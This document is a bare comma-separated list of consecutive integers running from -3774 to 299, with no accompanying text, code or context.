-3774, -3773, -3772, -3771, -3770, -3769, -3768, -3767, -3766, -3765, -3764, -3763, -3762, -3761, -3760, -3759, -3758, -3757, -3756, -3755, -3754, -3753, -3752, -3751, -3750, -3749, -3748, -3747, -3746, -3745, -3744, -3743, -3742, -3741, -3740, -3739, -3738, -3737, -3736, -3735, -3734, -3733, -3732, -3731, -3730, -3729, -3728, -3727, -3726, -3725, -3724, -3723, -3722, -3721, -3720, -3719, -3718, -3717, -3716, -3715, -3714, -3713, -3712, -3711, -3710, -3709, -3708, -3707, -3706, -3705, -3704, -3703, -3702, -3701, -3700, -3699, -3698, -3697, -3696, -3695, -3694, -3693, -3692, -3691, -3690, -3689, -3688, -3687, -3686, -3685, -3684, -3683, -3682, -3681, -3680, -3679, -3678, -3677, -3676, -3675, -3674, -3673, -3672, -3671, -3670, -3669, -3668, -3667, -3666, -3665, -3664, -3663, -3662, -3661, -3660, -3659, -3658, -3657, -3656, -3655, -3654, -3653, -3652, -3651, -3650, -3649, -3648, -3647, -3646, -3645, -3644, -3643, -3642, -3641, -3640, -3639, -3638, -3637, -3636, -3635, -3634, -3633, -3632, -3631, -3630, -3629, -3628, -3627, -3626, -3625, -3624, -3623, -3622, -3621, -3620, -3619, -3618, -3617, -3616, -3615, -3614, -3613, -3612, -3611, -3610, -3609, -3608, -3607, -3606, -3605, -3604, -3603, -3602, -3601, -3600, -3599, -3598, -3597, -3596, -3595, -3594, -3593, -3592, -3591, -3590, -3589, -3588, -3587, -3586, -3585, -3584, -3583, -3582, -3581, -3580, -3579, -3578, -3577, -3576, -3575, -3574, -3573, -3572, -3571, -3570, -3569, -3568, -3567, -3566, -3565, -3564, -3563, -3562, -3561, -3560, -3559, -3558, -3557, -3556, -3555, -3554, -3553, -3552, -3551, -3550, -3549, -3548, -3547, -3546, -3545, -3544, -3543, -3542, -3541, -3540, -3539, -3538, -3537, -3536, -3535, -3534, -3533, -3532, -3531, -3530, -3529, -3528, -3527, -3526, -3525, -3524, -3523, -3522, -3521, -3520, -3519, -3518, -3517, -3516, -3515, -3514, -3513, -3512, -3511, -3510, -3509, -3508, -3507, -3506, -3505, -3504, -3503, -3502, -3501, -3500, -3499, -3498, -3497, -3496, -3495, -3494, -3493, -3492, -3491, -3490, -3489, -3488, -3487, -3486, -3485, -3484, -3483, -3482, -3481, -3480, -3479, -3478, -3477, -3476, -3475, -3474, -3473, -3472, -3471, -3470, -3469, -3468, -3467, -3466, -3465, -3464, -3463, -3462, -3461, -3460, -3459, -3458, -3457, -3456, -3455, -3454, -3453, -3452, -3451, -3450, -3449, -3448, -3447, -3446, -3445, -3444, -3443, -3442, -3441, -3440, -3439, -3438, -3437, -3436, -3435, -3434, -3433, -3432, -3431, -3430, -3429, -3428, -3427, -3426, -3425, -3424, -3423, -3422, -3421, -3420, -3419, -3418, -3417, -3416, -3415, -3414, -3413, -3412, -3411, -3410, -3409, -3408, -3407, -3406, -3405, -3404, -3403, -3402, -3401, -3400, -3399, -3398, -3397, -3396, -3395, -3394, -3393, -3392, -3391, -3390, -3389, -3388, -3387, -3386, -3385, -3384, -3383, -3382, -3381, -3380, -3379, -3378, -3377, -3376, -3375, -3374, -3373, -3372, -3371, -3370, -3369, -3368, -3367, -3366, -3365, -3364, -3363, -3362, -3361, -3360, -3359, -3358, -3357, -3356, -3355, -3354, -3353, -3352, -3351, -3350, -3349, -3348, -3347, -3346, -3345, -3344, -3343, -3342, -3341, -3340, -3339, -3338, -3337, -3336, -3335, -3334, -3333, -3332, -3331, -3330, -3329, -3328, -3327, -3326, -3325, -3324, -3323, -3322, -3321, -3320, -3319, -3318, -3317, -3316, -3315, -3314, -3313, -3312, -3311, -3310, -3309, -3308, -3307, -3306, -3305, -3304, -3303, -3302, -3301, -3300, -3299, -3298, -3297, -3296, -3295, -3294, -3293, -3292, -3291, -3290, -3289, -3288, -3287, -3286, -3285, -3284, -3283, -3282, -3281, -3280, -3279, -3278, -3277, -3276, -3275, -3274, -3273, -3272, -3271, -3270, -3269, -3268, -3267, -3266, -3265, -3264, -3263, -3262, -3261, -3260, -3259, -3258, -3257, -3256, -3255, -3254, -3253, -3252, -3251, -3250, -3249, -3248, -3247, -3246, -3245, -3244, -3243, -3242, -3241, -3240, -3239, -3238, -3237, -3236, -3235, -3234, -3233, -3232, -3231, -3230, -3229, -3228, -3227, -3226, -3225, -3224, -3223, -3222, -3221, -3220, -3219, -3218, -3217, -3216, -3215, -3214, -3213, -3212, -3211, -3210, -3209, -3208, -3207, -3206, -3205, -3204, -3203, -3202, -3201, -3200, -3199, -3198, -3197, -3196, -3195, -3194, -3193, -3192, -3191, -3190, -3189, -3188, -3187, -3186, -3185, -3184, -3183, -3182, -3181, -3180, -3179, -3178, -3177, -3176, -3175, -3174, -3173, -3172, -3171, -3170, -3169, -3168, -3167, -3166, -3165, -3164, -3163, -3162, -3161, -3160, -3159, -3158, -3157, -3156, -3155, -3154, -3153, -3152, -3151, -3150, -3149, -3148, -3147, -3146, -3145, -3144, -3143, -3142, -3141, -3140, -3139, -3138, -3137, -3136, -3135, -3134, -3133, -3132, -3131, -3130, -3129, -3128, -3127, -3126, -3125, -3124, -3123, -3122, -3121, -3120, -3119, -3118, -3117, -3116, -3115, -3114, -3113, -3112, -3111, -3110, -3109, -3108, -3107, -3106, -3105, -3104, -3103, -3102, -3101, -3100, -3099, -3098, -3097, -3096, -3095, -3094, -3093, -3092, -3091, -3090, -3089, -3088, -3087, -3086, -3085, -3084, -3083, -3082, -3081, -3080, -3079, -3078, -3077, -3076, -3075, -3074, -3073, -3072, -3071, -3070, -3069, -3068, -3067, -3066, -3065, -3064, -3063, -3062, -3061, -3060, -3059, -3058, -3057, -3056, -3055, -3054, -3053, -3052, -3051, -3050, -3049, -3048, -3047, -3046, -3045, -3044, -3043, -3042, -3041, -3040, -3039, -3038, -3037, -3036, -3035, -3034, -3033, -3032, -3031, -3030, -3029, -3028, -3027, -3026, -3025, -3024, -3023, -3022, -3021, -3020, -3019, -3018, -3017, -3016, -3015, -3014, -3013, -3012, -3011, -3010, -3009, -3008, -3007, -3006, -3005, -3004, -3003, -3002, -3001, -3000, -2999, -2998, -2997, -2996, -2995, -2994, -2993, -2992, -2991, -2990, -2989, -2988, -2987, -2986, -2985, -2984, -2983, -2982, -2981, -2980, -2979, -2978, -2977, -2976, -2975, -2974, -2973, -2972, -2971, -2970, -2969, -2968, -2967, -2966, -2965, -2964, -2963, -2962, -2961, -2960, -2959, -2958, -2957, -2956, -2955, -2954, -2953, -2952, -2951, -2950, -2949, -2948, -2947, -2946, -2945, -2944, -2943, -2942, -2941, -2940, -2939, -2938, -2937, -2936, -2935, -2934, -2933, -2932, -2931, -2930, -2929, -2928, -2927, -2926, -2925, -2924, -2923, -2922, -2921, -2920, -2919, -2918, -2917, -2916, -2915, -2914, -2913, -2912, -2911, -2910, -2909, -2908, -2907, -2906, -2905, -2904, -2903, -2902, -2901, -2900, -2899, -2898, -2897, -2896, -2895, -2894, -2893, -2892, -2891, -2890, -2889, -2888, -2887, -2886, -2885, -2884, -2883, -2882, -2881, -2880, -2879, -2878, -2877, -2876, -2875, -2874, -2873, -2872, -2871, -2870, -2869, -2868, -2867, -2866, -2865, -2864, -2863, -2862, -2861, -2860, -2859, -2858, -2857, -2856, -2855, -2854, -2853, -2852, -2851, -2850, -2849, -2848, -2847, -2846, -2845, -2844, -2843, -2842, -2841, -2840, -2839, -2838, -2837, -2836, -2835, -2834, -2833, -2832, -2831, -2830, -2829, -2828, -2827, -2826, -2825, -2824, -2823, -2822, -2821, -2820, -2819, -2818, -2817, -2816, -2815, -2814, -2813, -2812, -2811, -2810, -2809, -2808, -2807, -2806, -2805, -2804, -2803, -2802, -2801, -2800, -2799, -2798, -2797, -2796, -2795, -2794, -2793, -2792, -2791, -2790, -2789, -2788, -2787, -2786, -2785, -2784, -2783, -2782, -2781, -2780, -2779, -2778, -2777, -2776, -2775, -2774, -2773, -2772, -2771, -2770, -2769, -2768, -2767, -2766, -2765, -2764, -2763, -2762, -2761, -2760, -2759, -2758, -2757, -2756, -2755, -2754, -2753, -2752, -2751, -2750, -2749, -2748, -2747, -2746, -2745, -2744, -2743, -2742, -2741, -2740, -2739, -2738, -2737, -2736, -2735, -2734, -2733, -2732, -2731, -2730, -2729, -2728, -2727, -2726, -2725, -2724, -2723, -2722, -2721, -2720, -2719, -2718, -2717, -2716, -2715, -2714, -2713, -2712, -2711, -2710, -2709, -2708, -2707, -2706, -2705, -2704, -2703, -2702, -2701, -2700, -2699, -2698, -2697, -2696, -2695, -2694, -2693, -2692, -2691, -2690, -2689, -2688, -2687, -2686, -2685, -2684, -2683, -2682, -2681, -2680, -2679, -2678, -2677, -2676, -2675, -2674, -2673, -2672, -2671, -2670, -2669, -2668, -2667, -2666, -2665, -2664, -2663, -2662, -2661, -2660, -2659, -2658, -2657, -2656, -2655, -2654, -2653, -2652, -2651, -2650, -2649, -2648, -2647, -2646, -2645, -2644, -2643, -2642, -2641, -2640, -2639, -2638, -2637, -2636, -2635, -2634, -2633, -2632, -2631, -2630, -2629, -2628, -2627, -2626, -2625, -2624, -2623, -2622, -2621, -2620, -2619, -2618, -2617, -2616, -2615, -2614, -2613, -2612, -2611, -2610, -2609, -2608, -2607, -2606, -2605, -2604, -2603, -2602, -2601, -2600, -2599, -2598, -2597, -2596, -2595, -2594, -2593, -2592, -2591, -2590, -2589, -2588, -2587, -2586, -2585, -2584, -2583, -2582, -2581, -2580, -2579, -2578, -2577, -2576, -2575, -2574, -2573, -2572, -2571, -2570, -2569, -2568, -2567, -2566, -2565, -2564, -2563, -2562, -2561, -2560, -2559, -2558, -2557, -2556, -2555, -2554, -2553, -2552, -2551, -2550, -2549, -2548, -2547, -2546, -2545, -2544, -2543, -2542, -2541, -2540, -2539, -2538, -2537, -2536, -2535, -2534, -2533, -2532, -2531, -2530, -2529, -2528, -2527, -2526, -2525, -2524, -2523, -2522, -2521, -2520, -2519, -2518, -2517, -2516, -2515, -2514, -2513, -2512, -2511, -2510, -2509, -2508, -2507, -2506, -2505, -2504, -2503, -2502, -2501, -2500, -2499, -2498, -2497, -2496, -2495, -2494, -2493, -2492, -2491, -2490, -2489, -2488, -2487, -2486, -2485, -2484, -2483, -2482, -2481, -2480, -2479, -2478, -2477, -2476, -2475, -2474, -2473, -2472, -2471, -2470, -2469, -2468, -2467, -2466, -2465, -2464, -2463, -2462, -2461, -2460, -2459, -2458, -2457, -2456, -2455, -2454, -2453, -2452, -2451, -2450, -2449, -2448, -2447, -2446, -2445, -2444, -2443, -2442, -2441, -2440, -2439, -2438, -2437, -2436, -2435, -2434, -2433, -2432, -2431, -2430, -2429, -2428, -2427, -2426, -2425, -2424, -2423, -2422, -2421, -2420, -2419, -2418, -2417, -2416, -2415, -2414, -2413, -2412, -2411, -2410, -2409, -2408, -2407, -2406, -2405, -2404, -2403, -2402, -2401, -2400, -2399, -2398, -2397, -2396, -2395, -2394, -2393, -2392, -2391, -2390, -2389, -2388, -2387, -2386, -2385, -2384, -2383, -2382, -2381, -2380, -2379, -2378, -2377, -2376, -2375, -2374, -2373, -2372, -2371, -2370, -2369, -2368, -2367, -2366, -2365, -2364, -2363, -2362, -2361, -2360, -2359, -2358, -2357, -2356, -2355, -2354, -2353, -2352, -2351, -2350, -2349, -2348, -2347, -2346, -2345, -2344, -2343, -2342, -2341, -2340, -2339, -2338, -2337, -2336, -2335, -2334, -2333, -2332, -2331, -2330, -2329, -2328, -2327, -2326, -2325, -2324, -2323, -2322, -2321, -2320, -2319, -2318, -2317, -2316, -2315, -2314, -2313, -2312, -2311, -2310, -2309, -2308, -2307, -2306, -2305, -2304, -2303, -2302, -2301, -2300, -2299, -2298, -2297, -2296, -2295, -2294, -2293, -2292, -2291, -2290, -2289, -2288, -2287, -2286, -2285, -2284, -2283, -2282, -2281, -2280, -2279, -2278, -2277, -2276, -2275, -2274, -2273, -2272, -2271, -2270, -2269, -2268, -2267, -2266, -2265, -2264, -2263, -2262, -2261, -2260, -2259, -2258, -2257, -2256, -2255, -2254, -2253, -2252, -2251, -2250, -2249, -2248, -2247, -2246, -2245, -2244, -2243, -2242, -2241, -2240, -2239, -2238, -2237, -2236, -2235, -2234, -2233, -2232, -2231, -2230, -2229, -2228, -2227, -2226, -2225, -2224, -2223, -2222, -2221, -2220, -2219, -2218, -2217, -2216, -2215, -2214, -2213, -2212, -2211, -2210, -2209, -2208, -2207, -2206, -2205, -2204, -2203, -2202, -2201, -2200, -2199, -2198, -2197, -2196, -2195, -2194, -2193, -2192, -2191, -2190, -2189, -2188, -2187, -2186, -2185, -2184, -2183, -2182, -2181, -2180, -2179, -2178, -2177, -2176, -2175, -2174, -2173, -2172, -2171, -2170, -2169, -2168, -2167, -2166, -2165, -2164, -2163, -2162, -2161, -2160, -2159, -2158, -2157, -2156, -2155, -2154, -2153, -2152, -2151, -2150, -2149, -2148, -2147, -2146, -2145, -2144, -2143, -2142, -2141, -2140, -2139, -2138, -2137, -2136, -2135, -2134, -2133, -2132, -2131, -2130, -2129, -2128, -2127, -2126, -2125, -2124, -2123, -2122, -2121, -2120, -2119, -2118, -2117, -2116, -2115, -2114, -2113, -2112, -2111, -2110, -2109, -2108, -2107, -2106, -2105, -2104, -2103, -2102, -2101, -2100, -2099, -2098, -2097, -2096, -2095, -2094, -2093, -2092, -2091, -2090, -2089, -2088, -2087, -2086, -2085, -2084, -2083, -2082, -2081, -2080, -2079, -2078, -2077, -2076, -2075, -2074, -2073, -2072, -2071, -2070, -2069, -2068, -2067, -2066, -2065, -2064, -2063, -2062, -2061, -2060, -2059, -2058, -2057, -2056, -2055, -2054, -2053, -2052, -2051, -2050, -2049, -2048, -2047, -2046, -2045, -2044, -2043, -2042, -2041, -2040, -2039, -2038, -2037, -2036, -2035, -2034, -2033, -2032, -2031, -2030, -2029, -2028, -2027, -2026, -2025, -2024, -2023, -2022, -2021, -2020, -2019, -2018, -2017, -2016, -2015, -2014, -2013, -2012, -2011, -2010, -2009, -2008, -2007, -2006, -2005, -2004, -2003, -2002, -2001, -2000, -1999, -1998, -1997, -1996, -1995, -1994, -1993, -1992, -1991, -1990, -1989, -1988, -1987, -1986, -1985, -1984, -1983, -1982, -1981, -1980, -1979, -1978, -1977, -1976, -1975, -1974, -1973, -1972, -1971, -1970, -1969, -1968, -1967, -1966, -1965, -1964, -1963, -1962, -1961, -1960, -1959, -1958, -1957, -1956, -1955, -1954, -1953, -1952, -1951, -1950, -1949, -1948, -1947, -1946, -1945, -1944, -1943, -1942, -1941, -1940, -1939, -1938, -1937, -1936, -1935, -1934, -1933, -1932, -1931, -1930, -1929, -1928, -1927, -1926, -1925, -1924, -1923, -1922, -1921, -1920, -1919, -1918, -1917, -1916, -1915, -1914, -1913, -1912, -1911, -1910, -1909, -1908, -1907, -1906, -1905, -1904, -1903, -1902, -1901, -1900, -1899, -1898, -1897, -1896, -1895, -1894, -1893, -1892, -1891, -1890, -1889, -1888, -1887, -1886, -1885, -1884, -1883, -1882, -1881, -1880, -1879, -1878, -1877, -1876, -1875, -1874, -1873, -1872, -1871, -1870, -1869, -1868, -1867, -1866, -1865, -1864, -1863, -1862, -1861, -1860, -1859, -1858, -1857, -1856, -1855, -1854, -1853, -1852, -1851, -1850, -1849, -1848, -1847, -1846, -1845, -1844, -1843, -1842, -1841, -1840, -1839, -1838, -1837, -1836, -1835, -1834, -1833, -1832, -1831, -1830, -1829, -1828, -1827, -1826, -1825, -1824, -1823, -1822, -1821, -1820, -1819, -1818, -1817, -1816, -1815, -1814, -1813, -1812, -1811, -1810, -1809, -1808, -1807, -1806, -1805, -1804, -1803, -1802, -1801, -1800, -1799, -1798, -1797, -1796, -1795, -1794, -1793, -1792, -1791, -1790, -1789, -1788, -1787, -1786, -1785, -1784, -1783, -1782, -1781, -1780, -1779, -1778, -1777, -1776, -1775, -1774, -1773, -1772, -1771, -1770, -1769, -1768, -1767, -1766, -1765, -1764, -1763, -1762, -1761, -1760, -1759, -1758, -1757, -1756, -1755, -1754, -1753, -1752, -1751, -1750, -1749, -1748, -1747, -1746, -1745, -1744, -1743, -1742, -1741, -1740, -1739, -1738, -1737, -1736, -1735, -1734, -1733, -1732, -1731, -1730, -1729, -1728, -1727, -1726, -1725, -1724, -1723, -1722, -1721, -1720, -1719, -1718, -1717, -1716, -1715, -1714, -1713, -1712, -1711, -1710, -1709, -1708, -1707, -1706, -1705, -1704, -1703, -1702, -1701, -1700, -1699, -1698, -1697, -1696, -1695, -1694, -1693, -1692, -1691, -1690, -1689, -1688, -1687, -1686, -1685, -1684, -1683, -1682, -1681, -1680, -1679, -1678, -1677, -1676, -1675, -1674, -1673, -1672, -1671, -1670, -1669, -1668, -1667, -1666, -1665, -1664, -1663, -1662, -1661, -1660, -1659, -1658, -1657, -1656, -1655, -1654, -1653, -1652, -1651, -1650, -1649, -1648, -1647, -1646, -1645, -1644, -1643, -1642, -1641, -1640, -1639, -1638, -1637, -1636, -1635, -1634, -1633, -1632, -1631, -1630, -1629, -1628, -1627, -1626, -1625, -1624, -1623, -1622, -1621, -1620, -1619, -1618, -1617, -1616, -1615, -1614, -1613, -1612, -1611, -1610, -1609, -1608, -1607, -1606, -1605, -1604, -1603, -1602, -1601, -1600, -1599, -1598, -1597, -1596, -1595, -1594, -1593, -1592, -1591, -1590, -1589, -1588, -1587, -1586, -1585, -1584, -1583, -1582, -1581, -1580, -1579, -1578, -1577, -1576, -1575, -1574, -1573, -1572, -1571, -1570, -1569, -1568, -1567, -1566, -1565, -1564, -1563, -1562, -1561, -1560, -1559, -1558, -1557, -1556, -1555, -1554, -1553, -1552, -1551, -1550, -1549, -1548, -1547, -1546, -1545, -1544, -1543, -1542, -1541, -1540, -1539, -1538, -1537, -1536, -1535, -1534, -1533, -1532, -1531, -1530, -1529, -1528, -1527, -1526, -1525, -1524, -1523, -1522, -1521, -1520, -1519, -1518, -1517, -1516, -1515, -1514, -1513, -1512, -1511, -1510, -1509, -1508, -1507, -1506, -1505, -1504, -1503, -1502, -1501, -1500, -1499, -1498, -1497, -1496, -1495, -1494, -1493, -1492, -1491, -1490, -1489, -1488, -1487, -1486, -1485, -1484, -1483, -1482, -1481, -1480, -1479, -1478, -1477, -1476, -1475, -1474, -1473, -1472, -1471, -1470, -1469, -1468, -1467, -1466, -1465, -1464, -1463, -1462, -1461, -1460, -1459, -1458, -1457, -1456, -1455, -1454, -1453, -1452, -1451, -1450, -1449, -1448, -1447, -1446, -1445, -1444, -1443, -1442, -1441, -1440, -1439, -1438, -1437, -1436, -1435, -1434, -1433, -1432, -1431, -1430, -1429, -1428, -1427, -1426, -1425, -1424, -1423, -1422, -1421, -1420, -1419, -1418, -1417, -1416, -1415, -1414, -1413, -1412, -1411, -1410, -1409, -1408, -1407, -1406, -1405, -1404, -1403, -1402, -1401, -1400, -1399, -1398, -1397, -1396, -1395, -1394, -1393, -1392, -1391, -1390, -1389, -1388, -1387, -1386, -1385, -1384, -1383, -1382, -1381, -1380, -1379, -1378, -1377, -1376, -1375, -1374, -1373, -1372, -1371, -1370, -1369, -1368, -1367, -1366, -1365, -1364, -1363, -1362, -1361, -1360, -1359, -1358, -1357, -1356, -1355, -1354, -1353, -1352, -1351, -1350, -1349, -1348, -1347, -1346, -1345, -1344, -1343, -1342, -1341, -1340, -1339, -1338, -1337, -1336, -1335, -1334, -1333, -1332, -1331, -1330, -1329, -1328, -1327, -1326, -1325, -1324, -1323, -1322, -1321, -1320, -1319, -1318, -1317, -1316, -1315, -1314, -1313, -1312, -1311, -1310, -1309, -1308, -1307, -1306, -1305, -1304, -1303, -1302, -1301, -1300, -1299, -1298, -1297, -1296, -1295, -1294, -1293, -1292, -1291, -1290, -1289, -1288, -1287, -1286, -1285, -1284, -1283, -1282, -1281, -1280, -1279, -1278, -1277, -1276, -1275, -1274, -1273, -1272, -1271, -1270, -1269, -1268, -1267, -1266, -1265, -1264, -1263, -1262, -1261, -1260, -1259, -1258, -1257, -1256, -1255, -1254, -1253, -1252, -1251, -1250, -1249, -1248, -1247, -1246, -1245, -1244, -1243, -1242, -1241, -1240, -1239, -1238, -1237, -1236, -1235, -1234, -1233, -1232, -1231, -1230, -1229, -1228, -1227, -1226, -1225, -1224, -1223, -1222, -1221, -1220, -1219, -1218, -1217, -1216, -1215, -1214, -1213, -1212, -1211, -1210, -1209, -1208, -1207, -1206, -1205, -1204, -1203, -1202, -1201, -1200, -1199, -1198, -1197, -1196, -1195, -1194, -1193, -1192, -1191, -1190, -1189, -1188, -1187, -1186, -1185, -1184, -1183, -1182, -1181, -1180, -1179, -1178, -1177, -1176, -1175, -1174, -1173, -1172, -1171, -1170, -1169, -1168, -1167, -1166, -1165, -1164, -1163, -1162, -1161, -1160, -1159, -1158, -1157, -1156, -1155, -1154, -1153, -1152, -1151, -1150, -1149, -1148, -1147, -1146, -1145, -1144, -1143, -1142, -1141, -1140, -1139, -1138, -1137, -1136, -1135, -1134, -1133, -1132, -1131, -1130, -1129, -1128, -1127, -1126, -1125, -1124, -1123, -1122, -1121, -1120, -1119, -1118, -1117, -1116, -1115, -1114, -1113, -1112, -1111, -1110, -1109, -1108, -1107, -1106, -1105, -1104, -1103, -1102, -1101, -1100, -1099, -1098, -1097, -1096, -1095, -1094, -1093, -1092, -1091, -1090, -1089, -1088, -1087, -1086, -1085, -1084, -1083, -1082, -1081, -1080, -1079, -1078, -1077, -1076, -1075, -1074, -1073, -1072, -1071, -1070, -1069, -1068, -1067, -1066, -1065, -1064, -1063, -1062, -1061, -1060, -1059, -1058, -1057, -1056, -1055, -1054, -1053, -1052, -1051, -1050, -1049, -1048, -1047, -1046, -1045, -1044, -1043, -1042, -1041, -1040, -1039, -1038, -1037, -1036, -1035, -1034, -1033, -1032, -1031, -1030, -1029, -1028, -1027, -1026, -1025, -1024, -1023, -1022, -1021, -1020, -1019, -1018, -1017, -1016, -1015, -1014, -1013, -1012, -1011, -1010, -1009, -1008, -1007, -1006, -1005, -1004, -1003, -1002, -1001, -1000, -999, -998, -997, -996, -995, -994, -993, -992, -991, -990, -989, -988, -987, -986, -985, -984, -983, -982, -981, -980, -979, -978, -977, -976, -975, -974, -973, -972, -971, -970, -969, -968, -967, -966, -965, -964, -963, -962, -961, -960, -959, -958, -957, -956, -955, -954, -953, -952, -951, -950, -949, -948, -947, -946, -945, -944, -943, -942, -941, -940, -939, -938, -937, -936, -935, -934, -933, -932, -931, -930, -929, -928, -927, -926, -925, -924, -923, -922, -921, -920, -919, -918, -917, -916, -915, -914, -913, -912, -911, -910, -909, -908, -907, -906, -905, -904, -903, -902, -901, -900, -899, -898, -897, -896, -895, -894, -893, -892, -891, -890, -889, -888, -887, -886, -885, -884, -883, -882, -881, -880, -879, -878, -877, -876, -875, -874, -873, -872, -871, -870, -869, -868, -867, -866, -865, -864, -863, -862, -861, -860, -859, -858, -857, -856, -855, -854, -853, -852, -851, -850, -849, -848, -847, -846, -845, -844, -843, -842, -841, -840, -839, -838, -837, -836, -835, -834, -833, -832, -831, -830, -829, -828, -827, -826, -825, -824, -823, -822, -821, -820, -819, -818, -817, -816, -815, -814, -813, -812, -811, -810, -809, -808, -807, -806, -805, -804, -803, -802, -801, -800, -799, -798, -797, -796, -795, -794, -793, -792, -791, -790, -789, -788, -787, -786, -785, -784, -783, -782, -781, -780, -779, -778, -777, -776, -775, -774, -773, -772, -771, -770, -769, -768, -767, -766, -765, -764, -763, -762, -761, -760, -759, -758, -757, -756, -755, -754, -753, -752, -751, -750, -749, -748, -747, -746, -745, -744, -743, -742, -741, -740, -739, -738, -737, -736, -735, -734, -733, -732, -731, -730, -729, -728, -727, -726, -725, -724, -723, -722, -721, -720, -719, -718, -717, -716, -715, -714, -713, -712, -711, -710, -709, -708, -707, -706, -705, -704, -703, -702, -701, -700, -699, -698, -697, -696, -695, -694, -693, -692, -691, -690, -689, -688, -687, -686, -685, -684, -683, -682, -681, -680, -679, -678, -677, -676, -675, -674, -673, -672, -671, -670, -669, -668, -667, -666, -665, -664, -663, -662, -661, -660, -659, -658, -657, -656, -655, -654, -653, -652, -651, -650, -649, -648, -647, -646, -645, -644, -643, -642, -641, -640, -639, -638, -637, -636, -635, -634, -633, -632, -631, -630, -629, -628, -627, -626, -625, -624, -623, -622, -621, -620, -619, -618, -617, -616, -615, -614, -613, -612, -611, -610, -609, -608, -607, -606, -605, -604, -603, -602, -601, -600, -599, -598, -597, -596, -595, -594, -593, -592, -591, -590, -589, -588, -587, -586, -585, -584, -583, -582, -581, -580, -579, -578, -577, -576, -575, -574, -573, -572, -571, -570, -569, -568, -567, -566, -565, -564, -563, -562, -561, -560, -559, -558, -557, -556, -555, -554, -553, -552, -551, -550, -549, -548, -547, -546, -545, -544, -543, -542, -541, -540, -539, -538, -537, -536, -535, -534, -533, -532, -531, -530, -529, -528, -527, -526, -525, -524, -523, -522, -521, -520, -519, -518, -517, -516, -515, -514, -513, -512, -511, -510, -509, -508, -507, -506, -505, -504, -503, -502, -501, -500, -499, -498, -497, -496, -495, -494, -493, -492, -491, -490, -489, -488, -487, -486, -485, -484, -483, -482, -481, -480, -479, -478, -477, -476, -475, -474, -473, -472, -471, -470, -469, -468, -467, -466, -465, -464, -463, -462, -461, -460, -459, -458, -457, -456, -455, -454, -453, -452, -451, -450, -449, -448, -447, -446, -445, -444, -443, -442, -441, -440, -439, -438, -437, -436, -435, -434, -433, -432, -431, -430, -429, -428, -427, -426, -425, -424, -423, -422, -421, -420, -419, -418, -417, -416, -415, -414, -413, -412, -411, -410, -409, -408, -407, -406, -405, -404, -403, -402, -401, -400, -399, -398, -397, -396, -395, -394, -393, -392, -391, -390, -389, -388, -387, -386, -385, -384, -383, -382, -381, -380, -379, -378, -377, -376, -375, -374, -373, -372, -371, -370, -369, -368, -367, -366, -365, -364, -363, -362, -361, -360, -359, -358, -357, -356, -355, -354, -353, -352, -351, -350, -349, -348, -347, -346, -345, -344, -343, -342, -341, -340, -339, -338, -337, -336, -335, -334, -333, -332, -331, -330, -329, -328, -327, -326, -325, -324, -323, -322, -321, -320, -319, -318, -317, -316, -315, -314, -313, -312, -311, -310, -309, -308, -307, -306, -305, -304, -303, -302, -301, -300, -299, -298, -297, -296, -295, -294, -293, -292, -291, -290, -289, -288, -287, -286, -285, -284, -283, -282, -281, -280, -279, -278, -277, -276, -275, -274, -273, -272, -271, -270, -269, -268, -267, -266, -265, -264, -263, -262, -261, -260, -259, -258, -257, -256, -255, -254, -253, -252, -251, -250, -249, -248, -247, -246, -245, -244, -243, -242, -241, -240, -239, -238, -237, -236, -235, -234, -233, -232, -231, -230, -229, -228, -227, -226, -225, -224, -223, -222, -221, -220, -219, -218, -217, -216, -215, -214, -213, -212, -211, -210, -209, -208, -207, -206, -205, -204, -203, -202, -201, -200, -199, -198, -197, -196, -195, -194, -193, -192, -191, -190, -189, -188, -187, -186, -185, -184, -183, -182, -181, -180, -179, -178, -177, -176, -175, -174, -173, -172, -171, -170, -169, -168, -167, -166, -165, -164, -163, -162, -161, -160, -159, -158, -157, -156, -155, -154, -153, -152, -151, -150, -149, -148, -147, -146, -145, -144, -143, -142, -141, -140, -139, -138, -137, -136, -135, -134, -133, -132, -131, -130, -129, -128, -127, -126, -125, -124, -123, -122, -121, -120, -119, -118, -117, -116, -115, -114, -113, -112, -111, -110, -109, -108, -107, -106, -105, -104, -103, -102, -101, -100, -99, -98, -97, -96, -95, -94, -93, -92, -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81, -80, -79, -78, -77, -76, -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -65, -64, -63, -62, -61, -60, -59, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49, -48, -47, -46, -45, -44, -43, -42, -41, -40, -39, -38, -37, -36, -35, -34, -33, -32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 